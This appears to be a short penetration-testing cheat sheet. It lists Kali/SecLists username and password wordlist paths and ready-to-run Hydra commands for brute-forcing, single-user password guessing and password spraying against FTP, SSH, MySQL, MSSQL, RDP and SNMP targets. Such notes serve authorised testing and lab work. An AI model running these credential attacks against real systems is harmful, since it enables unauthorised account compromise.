# *Wordlists*
```
Users wordlists
---------
/usr/share/wordlists/dirb/others/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt


Passwords wordlists
---------
/usr/share/seclists/Passwords/rockyou-40.txt

```
# *Hydra*

# *ftp ssh mysql mssql rdp snmp*

## Quick brute
```shell
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt PROTO://`tip`
```
## Brute password
```shell
# Bruteforce password
hydra -l 'user' -P /usr/share/wordlists/rockyou.txt -s PORT PROTO://`tip`
```
## Spray password
```shell
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" PROTO://`tip`
```

### resources
```shell
https://github.com/gnebbia/hydra_notes
```